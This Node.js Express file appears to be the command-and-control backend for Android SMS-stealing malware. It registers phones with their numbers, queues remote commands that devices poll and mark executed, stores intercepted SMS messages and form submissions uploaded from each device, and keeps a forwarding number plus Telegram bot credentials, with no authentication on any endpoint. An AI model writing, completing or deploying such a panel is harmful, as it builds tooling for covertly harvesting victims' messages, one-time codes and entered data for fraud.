const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Database setup - USE MEMORY DATABASE FOR NOW (FIXED)
const dbPath = ':memory:'; // Temporary memory database
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('❌ Database connection error:', err);
    } else {
        console.log('✅ Connected to SQLite database');
        initDB();
    }
});

// Initialize database - SIMPLIFIED VERSION
function initDB() {
    console.log('🔄 Initializing database...');
    
    db.serialize(() => {
        // Devices table
        db.run(`CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        )`, (err) => {
            if (err) console.error('❌ Error creating devices table:', err);
            else console.log('✅ Devices table created/checked');
        });

        // Commands table
        db.run(`CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        )`, (err) => {
            if (err) console.error('❌ Error creating commands table:', err);
            else console.log('✅ Commands table created/checked');
        });

        // SMS logs table
        db.run(`CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        )`, (err) => {
            if (err) console.error('❌ Error creating sms_logs table:', err);
            else console.log('✅ SMS logs table created/checked');
        });

        // Form submissions table
        db.run(`CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        )`, (err) => {
            if (err) console.error('❌ Error creating form_submissions table:', err);
            else console.log('✅ Form submissions table created/checked');
        });

        // Global settings table
        db.run(`CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        )`, (err) => {
            if (err) console.error('❌ Error creating global_settings table:', err);
            else console.log('✅ Global settings table created/checked - Database ready!');
        });
    });
}

// Helper function for database queries
function dbGet(query, params = []) {
    return new Promise((resolve, reject) => {
        db.get(query, params, (err, row) => {
            if (err) {
                console.error('❌ dbGet Error:', err);
                reject(err);
            } else {
                resolve(row);
            }
        });
    });
}

function dbAll(query, params = []) {
    return new Promise((resolve, reject) => {
        db.all(query, params, (err, rows) => {
            if (err) {
                console.error('❌ dbAll Error:', err);
                reject(err);
            } else {
                resolve(rows);
            }
        });
    });
}

function dbRun(query, params = []) {
    return new Promise((resolve, reject) => {
        db.run(query, params, function(err) {
            if (err) {
                console.error('❌ dbRun Error:', err);
                reject(err);
            } else {
                resolve({ lastID: this.lastID, changes: this.changes });
            }
        });
    });
}

// FEATURE 1: Device Registration - FIXED VERSION
app.post('/api/device/register', async (req, res) => {
    console.log('📱 Device registration request received:', req.body);
    
    try {
        const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
        
        if (!device_id) {
            console.log('❌ Missing device_id');
            return res.status(400).json({ status: 'error', message: 'device_id required' });
        }
        
        const last_seen = new Date().toISOString();
        console.log(`🔍 Checking if device exists: ${device_id}`);
        
        const existing = await dbGet('SELECT * FROM devices WHERE device_id = ?', [device_id]);

        if (existing) {
            console.log(`🔄 Updating existing device: ${device_id}`);
            await dbRun(
                `UPDATE devices SET device_name = ?, os_version = ?, phone_number = ?, 
                battery_level = ?, last_seen = ? WHERE device_id = ?`,
                [device_name || 'Unknown Device', os_version || 'Unknown', phone_number || 'Unknown', 
                 battery_level || 0, last_seen, device_id]
            );
            console.log(`✅ Device updated: ${device_id}`);
        } else {
            console.log(`🆕 Registering new device: ${device_id}`);
            await dbRun(
                `INSERT INTO devices (device_id, device_name, os_version, phone_number, 
                battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)`,
                [device_id, device_name || 'Unknown Device', os_version || 'Unknown', 
                 phone_number || 'Unknown', battery_level || 0, last_seen, last_seen]
            );
            console.log(`✅ New device registered: ${device_id}`);
        }

        res.json({ 
            status: 'success', 
            message: 'Device data received and updated.',
            device_id: device_id
        });
    } catch (error) {
        console.error('❌ Device registration error:', error);
        res.status(500).json({ 
            status: 'error', 
            message: error.message,
            details: 'Database operation failed'
        });
    }
});

// FEATURE 2: Get Devices
app.get('/api/devices', async (req, res) => {
    console.log('📋 Getting devices list');
    
    try {
        const rows = await dbAll('SELECT * FROM devices ORDER BY created_at ASC');
        const currentTime = new Date();
        
        console.log(`📊 Found ${rows.length} devices`);
        
        const devices = rows.map(device => {
            const lastSeen = new Date(device.last_seen);
            const timeDiff = (currentTime - lastSeen) / 1000;
            const is_online = timeDiff < 20;

            return {
                device_id: device.device_id,
                device_name: device.device_name,
                os_version: device.os_version,
                phone_number: device.phone_number,
                battery_level: device.battery_level,
                is_online: is_online,
                created_at: device.created_at,
                last_seen: device.last_seen
            };
        });

        res.json(devices);
    } catch (error) {
        console.error('❌ Error loading devices:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 3: Update SMS Forward
app.post('/api/config/sms_forward', async (req, res) => {
    try {
        const { forward_number } = req.body;
        console.log(`📞 Updating SMS forward number: ${forward_number}`);
        
        await dbRun(
            `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('sms_forward_number', ?)`,
            [forward_number]
        );
        res.json({ status: 'success', message: 'Forwarding number updated successfully.' });
    } catch (error) {
        console.error('❌ Error updating SMS forward:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 4: Get SMS Forward
app.get('/api/config/sms_forward', async (req, res) => {
    try {
        const row = await dbGet(
            'SELECT setting_value FROM global_settings WHERE setting_key = ?',
            ['sms_forward_number']
        );
        res.json({ forward_number: row ? row.setting_value : null });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 5: Telegram Config
app.post('/api/config/telegram', async (req, res) => {
    try {
        const { telegram_bot_token, telegram_chat_id } = req.body;
        console.log('🤖 Updating Telegram config');
        
        await dbRun(
            `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('telegram_bot_token', ?)`,
            [telegram_bot_token]
        );
        await dbRun(
            `INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('telegram_chat_id', ?)`,
            [telegram_chat_id]
        );
        res.json({ status: 'success', message: 'Telegram details updated successfully.' });
    } catch (error) {
        console.error('❌ Error updating Telegram config:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/config/telegram', async (req, res) => {
    try {
        const rows = await dbAll(
            `SELECT * FROM global_settings 
            WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')`
        );
        
        const result = {};
        rows.forEach(row => {
            result[row.setting_key] = row.setting_value;
        });
        
        res.json({
            telegram_bot_token: result.telegram_bot_token || null,
            telegram_chat_id: result.telegram_chat_id || null
        });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 6: Send Command
app.post('/api/command/send', async (req, res) => {
    try {
        const { device_id, command_type, command_data } = req.body;
        console.log(`📨 Sending command to device ${device_id}: ${command_type}`);
        
        await dbRun(
            `INSERT INTO commands (device_id, command_type, command_data, status) 
            VALUES (?, ?, ?, 'pending')`,
            [device_id, command_type, JSON.stringify(command_data)]
        );
        res.json({ status: 'success', message: 'Command queued successfully.' });
    } catch (error) {
        console.error('❌ Error sending command:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Get Commands
app.get('/api/device/:deviceId/commands', async (req, res) => {
    try {
        const { deviceId } = req.params;
        console.log(`📥 Getting pending commands for device: ${deviceId}`);
        
        const rows = await dbAll(
            `SELECT * FROM commands WHERE device_id = ? AND status = 'pending'`,
            [deviceId]
        );

        if (rows.length > 0) {
            console.log(`📨 Found ${rows.length} pending commands`);
            const commandIds = rows.map(r => r.id);
            const placeholders = commandIds.map(() => '?').join(',');
            const query = `UPDATE commands SET status = 'sent' WHERE id IN (${placeholders})`;
            await dbRun(query, commandIds);
        }

        const commands = rows.map(cmd => ({
            id: cmd.id,
            command_type: cmd.command_type,
            command_data: cmd.command_data
        }));

        res.json(commands);
    } catch (error) {
        console.error('❌ Error getting commands:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Execute Command
app.post('/api/command/:commandId/execute', async (req, res) => {
    try {
        const { commandId } = req.params;
        console.log(`✅ Marking command ${commandId} as executed`);
        
        await dbRun(`UPDATE commands SET status = 'executed' WHERE id = ?`, [commandId]);
        res.json({ status: 'success', message: 'Command marked as executed.' });
    } catch (error) {
        console.error('❌ Error executing command:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 7: Forms
app.post('/api/device/:deviceId/forms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { custom_data } = req.body;
        console.log(`📄 Form submission from device: ${deviceId}`);
        
        await dbRun(
            'INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)',
            [deviceId, custom_data]
        );
        res.json({ status: 'success', message: 'Form data saved.' });
    } catch (error) {
        console.error('❌ Error saving form:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/device/:deviceId/forms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const rows = await dbAll(
            'SELECT * FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC',
            [deviceId]
        );
        res.json(rows);
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 8: SMS Logs
app.post('/api/device/:deviceId/sms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { sender, message_body } = req.body;
        console.log(`📱 SMS received from ${sender} to device ${deviceId}`);
        
        await dbRun(
            'INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)',
            [deviceId, sender, message_body]
        );
        res.json({ status: 'success', message: 'SMS logged.' });
    } catch (error) {
        console.error('❌ Error logging SMS:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/device/:deviceId/sms', async (req, res) => {
    try {
        const { deviceId } = req.params;
        const rows = await dbAll(
            'SELECT * FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC',
            [deviceId]
        );
        res.json(rows);
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Delete Device
app.delete('/api/device/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;
        console.log(`🗑️ Deleting device: ${deviceId}`);
        
        await dbRun('DELETE FROM devices WHERE device_id = ?', [deviceId]);
        await dbRun('DELETE FROM sms_logs WHERE device_id = ?', [deviceId]);
        await dbRun('DELETE FROM form_submissions WHERE device_id = ?', [deviceId]);
        res.json({ status: 'success', message: 'Device and related data deleted.' });
    } catch (error) {
        console.error('❌ Error deleting device:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Delete SMS
app.delete('/api/sms/:smsId', async (req, res) => {
    try {
        const { smsId } = req.params;
        await dbRun('DELETE FROM sms_logs WHERE id = ?', [smsId]);
        res.json({ status: 'success', message: 'SMS deleted.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    console.log('🏥 Health check requested');
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        database: 'SQLite in-memory',
        version: '1.0.0'
    });
});

// Test endpoint for manual registration
app.post('/api/test/register', (req, res) => {
    const testDevice = {
        device_id: 'test-device-' + Date.now(),
        device_name: 'Test Device',
        os_version: 'Android 13',
        battery_level: 85,
        phone_number: '+919876543210'
    };
    
    console.log('🧪 Test registration:', testDevice);
    req.body = testDevice;
    
    // Call the actual registration endpoint
    const mockRes = {
        json: (data) => {
            console.log('🧪 Test registration response:', data);
            res.json({ test: true, ...data });
        },
        status: (code) => {
            return {
                json: (data) => {
                    console.log('🧪 Test registration error:', data);
                    res.status(code).json({ test: true, ...data });
                }
            };
        }
    };
    
    // Call the actual handler
    const handler = app._router.stack.find(layer => layer.route && layer.route.path === '/api/device/register');
    if (handler) {
        handler.route.stack[0].handle(req, mockRes);
    } else {
        res.json({ error: 'Handler not found' });
    }
});

// For Vercel serverless
module.exports = app;

// For local testing
if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`🌐 Health check: http://localhost:${PORT}/api/health`);
        console.log(`📱 Test registration: http://localhost:${PORT}/api/test/register`);
    });
}
